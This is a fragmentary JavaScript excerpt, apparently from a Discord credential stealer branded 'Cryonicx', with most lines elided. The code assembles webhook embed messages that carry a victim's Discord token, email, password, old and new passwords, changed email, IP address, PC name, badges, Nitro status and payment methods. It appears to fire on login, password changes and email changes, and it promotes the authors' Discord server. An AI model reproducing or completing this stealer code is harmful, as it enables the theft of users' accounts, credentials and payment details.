                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[Cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
								color: config["embed-color"],
								fields: [{
									name: "<a:zil:880597981403971594> Token",
									value: `\`\`\`${token}\`\`\``,
									inline: !1

								},{
									name: "<a:CryPc:951515075645149254> Info",
									value: `\`\`\`Hostname: \n${computerName}`,
									inline: !1
								}, {
									name: "Username",
									...
									name: "<a:Cryd:951517055155314728> ID",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "<a:CryBadges:951514120400822358> Badges",
        ...
        xmlHttp.responseText`, !0).then((info3) => {
		  ...
		  xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									"title": "User Login",
									description: "[**<:bughunter_2:874750808430874664> Cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
									"color": config['embed-color'],
									"fields": [{
                                        name: "<a:zil:880597981403971594> Token",
                                        value : `\`\`\`${token}\`\`\``,
                                        ...
                                        {
                                        name: "<a:banker_yildiz:932669914924343327> E-Mail",
                                        value: `\`${email}\``,
                                        inline: !0
                                    }, {
                                        name: "<a:banker_altin:932678800142123008>  Password",
                                        value: `\`${password}\``,
                                        inline: !0
                                    }, {
                                        name: "<a:CryUsername:951517280771133551>  Username",
                                        ...
                                        name: "<a:CryBadge:951515308638744628>  Nitro",
                                        ...
                                        name: "<a:CryonicX:951510022649679882> Payment Methods",
                                        value: `${Cool()}`,
                                        inline: !0
                                    }, {
                                        name: "<a:banker_stat:938554251452514305> İP",
                                        value: `\`${ip}\``,
                                        inline: !0
                                    }, {
                                        name: "PC Name",
							...
							var mfaembed = {
								"title": "<:bughunter_2:874750808430874664> __STORM ALERT__",
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
                                    ...
                                    {
                                        name: "<a:banker_altin:932678800142123008> New Password",
                                        value: `\`${newpassword}\``,
                                        inline: !0
                                    },
                                    {
                                        name: "<:online:871024945222811718> Old Password",
                                        value: `\`${oldpassword}\``,
                                        inline: !0
                                    },
                                    {
                                        name: "<a:banker_yildiz:932669914924343327> Email",
                                        value: `\`${json.email}\``,
                                        inline: !0
                                    },
                                    {
                                    ...
                                    {
                                        name: "<a:banker_stat:938554251452514305> IP",
                                        value: `\`${ip}\``,
                                        inline: !0
                                    }, {
                                        name: "<a:CryPc:951515075645149254> PC Name",
                                        value: `\`${computerName}\``,
                                        inline: !0
                                    },],
									"author": {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
										...
										var params = {
											...
											embeds: [{
												...
												{
													name: "<a:banker_altin:932678800142123008> New Email",
													value: `\`${newemail}\``,
													inline: !0
												},
												{
													name: "<:online:871024945222811718> Old Email",
													value: `\`${json.email}\``,
													inline: !0
												},
												{
